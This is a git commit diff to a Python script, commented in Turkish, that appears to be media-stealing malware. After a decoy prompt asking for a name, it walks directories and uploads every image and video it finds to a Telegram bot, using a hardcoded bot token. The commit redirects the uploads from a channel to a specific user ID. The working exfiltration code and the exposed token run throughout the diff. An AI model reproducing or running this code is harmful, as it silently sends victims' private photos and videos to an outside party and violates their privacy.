ed3f87cbeec101c53d864a13f86b92687758bdab
fatique <fatiqueosprivacy@proton.me>
2024-10-26 10:39:10 +0300

    Update main.py

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import os
 import requests
 
 BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
-CHANNEL_ID = "@p8JdyixgqKFlMjA0"
+USER_ID = "6044093818"  # Buraya kullanıcı ID'sini yazmalısınız.
 
 # Kullanıcıdan isim alma
 name = input("Lütfen bir isim girin: ")
@@ -31,7 +31,7 @@ directories = [
 image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
 video_extensions = [".mp4", ".mov", ".avi"]
 
-def send_media_to_channel(file_path):
+def send_media_to_user(file_path):
     # Dosya türüne göre uygun URL belirle
     if file_path.endswith(tuple(image_extensions)):
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
@@ -40,16 +40,16 @@ def send_media_to_channel(file_path):
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
         media_type = "video"
     else:
+        print(f"Desteklenmeyen dosya türü: {file_path}")
         return  # Desteklenmeyen dosya türü
 
     with open(file_path, "rb") as media_file:
-        data = {"chat_id": CHANNEL_ID}
+        data = {"chat_id": USER_ID}
         files = {media_type: media_file}
 
         response = requests.post(url, data=data, files=files)
         
         if response.status_code == 200:
-            print(f"Telegram'a gönderiliyor: {file_path}")
             print(f"Telegram'a gönderildi: {file_path}")
         else:
             print(f"Telegram'a gönderilirken hata oluştu: {response.text}")
@@ -61,7 +61,7 @@ def check_and_send_files():
                 for file in files:
                     file_path = os.path.join(root, file)
                     if file_path.endswith(tuple(image_extensions + video_extensions)):
-                        send_media_to_channel(file_path)
+                        send_media_to_user(file_path)
         else:
             print(f"Dizin mevcut değil: {directory}")
 
